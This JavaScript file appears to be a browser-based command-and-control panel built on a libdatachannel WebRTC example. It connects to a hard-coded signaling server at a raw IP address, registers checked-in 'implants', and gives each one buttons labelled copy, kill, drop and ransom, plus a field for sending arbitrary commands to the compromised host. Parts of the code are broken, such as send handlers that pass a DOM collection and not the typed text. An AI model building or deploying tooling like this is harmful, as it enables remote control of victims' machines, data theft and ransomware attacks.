/*
 * libdatachannel example web client
 * Copyright (C) 2020 Lara Mackey
 * Copyright (C) 2020 Paul-Louis Ageneau
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; If not, see <http://www.gnu.org/licenses/>.
 */


window.addEventListener('load', () => {



//C2 Server ID
const localId = "6969";

//Signaling server
const url = `ws://73.4.243.143:8000/${localId}`;

//Stun server configuration
const config = {
  iceServers : [ {
    urls : 'stun:stun.l.google.com:19302',
  } ],
};

var connectedImplants = 0;

const peerConnectionMap = {};
const dataChannelMap = {};


//const offerId = document.getElementById('offerId');
//const offerBtn = document.getElementById('offerBtn');
const _localId = document.getElementById('localId');
//_localId.textContent = localId;
// tableCreate("1122","wdaadw");
// tableCreate("1123","wdaadw");

function addToLog(id,message) {
  const a = document.getElementById("log-" + id);
  var d = document.createElement("DIV");
  d.appendChild(document.createTextNode(message));
  a.appendChild(d);
}

console.log('Connecting to signaling...');
openSignaling(url)
    .then((ws) => {
      console.log('WebSocket connected, signaling ready');
      //Ready to signal
    })
    .catch((err) => console.error(err));



function openSignaling(url) {
  return new Promise((resolve, reject) => {
    const ws = new WebSocket(url);
    ws.onopen = () => resolve(ws);
    ws.onerror = () => reject(new Error('WebSocket error'));
    ws.onclose = () => console.error('WebSocket disconnected');
    ws.onmessage = (e) => {
      if (typeof (e.data) != 'string')
        return;
      const message = JSON.parse(e.data);
      console.log(message);
      const {id, type} = message;

      let pc = peerConnectionMap[id];
      if (!pc) {
        if (type != 'offer')
          return;

        // Create PeerConnection when received an offer
        console.log(`Answering to ${id}`);
        pc = createPeerConnection(ws, id);
      }

      switch (type) {
      case 'offer':

      case 'answer':
        pc.setRemoteDescription({
            sdp : message.description,
            type : message.type,
          }).then(() => {
          if (type == 'offer') {
            // Send answer
            sendLocalDescription(ws, id, pc, 'answer');
          }
        });
        break;

      case 'candidate':
        pc.addIceCandidate({
          candidate : message.candidate,
          sdpMid : message.mid,
        });
        break;
      }
    }
  });
}

function offerPeerConnection(ws, id) {
  // Create PeerConnection
  console.log(`Offering to ${id}`);
  pc = createPeerConnection(ws, id);

  // Create DataChannel
  const label = "test";
  console.log(`Creating DataChannel with label "${label}"`);
  const dc = pc.createDataChannel(label);
  setupDataChannel(dc, id);

  // Send offer
  sendLocalDescription(ws, id, pc, 'offer');
}

// Create and setup a PeerConnection
function createPeerConnection(ws, id) {
  const pc = new RTCPeerConnection(config);
  pc.oniceconnectionstatechange = () => console.log(`Connection state: ${pc.iceConnectionState}`);
  pc.onicegatheringstatechange = () => console.log(`Gathering state: ${pc.iceGatheringState}`);
  pc.onicecandidate = (e) => {
    if (e.candidate && e.candidate.candidate) {
      // Send candidate
      sendLocalCandidate(ws, id, e.candidate);
    }
  };
  pc.ondatachannel = (e) => {
    const dc = e.channel;
    console.log(`"DataChannel from ${id} received with label "${dc.label}"`);
    setupDataChannel(dc, id);

  };

  peerConnectionMap[id] = pc;
  return pc;
}

//Interpret Message
function interpretMessage(message, dc){
  

  if (message.startsWith("check-in")){
    implantId = message.split(' ')[1];
    console.log('Implant checkin in');
    tableCreate(implantId, dc);
  }

  addToLog(implantId,message); //Test
  
}

// Setup a DataChannel
function setupDataChannel(dc, id) {
  dc.onopen = () => {
    console.log(`DataChannel from ${id} open`);

  };
  dc.onclose = () => { console.log(`DataChannel from ${id} closed`); };
  dc.onmessage = (e) => {
    console.log('RECEIVED MESSAGE');
    if (typeof (e.data) != 'string')
      return;

    //Consumes message
    interpretMessage(e.data,dc);
    console.log(`Message from ${id} received: ${e.data}`);
    //document.body.appendChild(document.createTextNode(e.data));
  };

  dataChannelMap[id] = dc;
  return dc;
}

function sendLocalDescription(ws, id, pc, type) {
  (type == 'offer' ? pc.createOffer() : pc.createAnswer())
      .then((desc) => pc.setLocalDescription(desc))
      .then(() => {
        const {sdp, type} = pc.localDescription;
        ws.send(JSON.stringify({
          id,
          type,
          description : sdp,
        }));
      });
}

function sendLocalCandidate(ws, id, cand) {
  const {candidate, sdpMid} = cand;
  ws.send(JSON.stringify({
    id,
    type : 'candidate',
    candidate,
    mid : sdpMid,
  }));
}

// Helper function to generate a random ID
function randomId(length) {
  const characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
  const pickRandom = () => characters.charAt(Math.floor(Math.random() * characters.length));
  return [...Array(length) ].map(pickRandom).join('');
}

});

//Helper function to create table with implants
function tableCreate(implantId, dc) {
  const body = document.body;
  const tbl = document.createElement('table');

  for (let i = 0; i < 6; i++) {
    const tr = tbl.insertRow();
    tr.className = "tr-" + implantId;

    for (let j = 0; j < 2; j++) {
      
      // if (i === 2 && j === 1) {
      //   break;

      if(i == 0 && j == 0) {
        const td = tr.insertCell();
        td.appendChild(document.createTextNode(`ON`));
        td.style.backgroundColor = 'green';
        //td.appendChild(document.createTextNode(`   ${implantId}`));
        td.style.border = '2px solid black';

      }else if(i == 0 && j == 1) {
        const td = tr.insertCell();
        td.appendChild(document.createTextNode(`   ${implantId}`));

        //td.appendChild(document.createTextNode(`ONLINE`));
        td.style.border = '2px solid black';
        td.style.backgroundColor = 'Gainsboro';

      }else if(i == 1 && j == 0) {
        const td = tr.insertCell();
        var btn = document.createElement("BUTTON");
        btn.innerHTML = "C0PY";
        btn.style.color = 'gray';
        btn.style.backgroundColor = 'blue';
        function myfunction(dc){
          dc.send("copy");
        }
        btn.onclick = () => myfunction(dc);
        td.appendChild(btn);
        td.style.border = '2px solid black';
        td.style.backgroundColor = 'Gainsboro';


      }else if(i == 2 && j == 0) {
        const td = tr.insertCell();
        var btn = document.createElement("BUTTON");
        btn.innerHTML = "K1LL";
        btn.style.color = 'gray';
        btn.style.backgroundColor = 'red';
        function myfunction(dc){
          dc.send("kill");
        }
        
        //btn.onclick = () => myfunction(dc);
        btn.onclick = () => myfunction();
        td.appendChild(btn);
        td.style.border = '2px solid black';
        td.style.backgroundColor = 'Gainsboro';

 
        //td.appendChild(document.createTextNode(`+ Info`));
        

      } else if (i == 1 && j == 1) {
        var td = tr.insertCell();
        td.id = 'log-' + implantId;
        //td.appendChild(document.createTextNode(`This is an example of a pretty big log That maybe contain or not some breaks and it can definitely fill it up`));
        td.style.border = '2px solid black';
        td.style.backgroundColor = 'Gainsboro'
        if (i === 1 && j === 1) {
          td.setAttribute('rowSpan', '4');
        }
      } else if(i == 5 && j == 0){

        const td = tr.insertCell();
        var btn = document.createElement("BUTTON");
        btn.innerHTML = "SEND";
        btn.id = 'btn1'
        btn.style.color = 'gray';
        function myfunction(dc){
          dc.send(tbl.getElementsByClassName("input-" + implantId));
        }
          
        btn.onclick = () => myfunction(dc);
        btn.style.backgroundColor = 'springgreen';
        td.appendChild(btn); 
        td.style.border = '2px solid black';
        td.style.backgroundColor = 'Gainsboro';
      
      } else if (i == 5 && j == 1){
        const td = tr.insertCell();
        td.style.backgroundColor = 'springgreen';
        //td.appendChild(document.createTextNode(`Additional Information`));
        var input = document.createElement("input");
        input.placeholder = 'Type any command here'
        input.className = "input-" + implantId;
        td.appendChild(input);
        td.style.border = '2px solid black';
        td.colSpan = '2';
        

      }else if(i == 4 && j == 0){
        const td = tr.insertCell();
        var btn = document.createElement("BUTTON");
        btn.innerHTML = "RASM";
        btn.id = 'btnRansom'
        btn.style.color = 'gray';


        btn.style.backgroundColor = 'darkmagenta';
        td.appendChild(btn); 
        td.style.border = '2px solid black';
        td.style.backgroundColor = 'Gainsboro';

          //test
        


      }else if(i == 3 && j == 0){
        const td = tr.insertCell();
        var btn = document.createElement("BUTTON");
        btn.innerHTML = "DROP";
        btn.id = 'btnDrop'
        btn.style.color = 'gray';
        function myfunction(dc){
          dc.send(tbl.getElementsByClassName("input-" + implantId));
        }
          
        btn.onclick = () => myfunction(dc);
        btn.style.backgroundColor = 'cyan';
        td.appendChild(btn); 
        td.style.border = '2px solid black';
        td.style.backgroundColor = 'Gainsboro';


      }

    }
  }
  //tbl.className = "styled-table";
  tbl.style = 'a';
  tbl.classList.add('a');
  tbl.style.border = '2px solid black';
  body.prepend(tbl, document.body.firstElementChild);


}
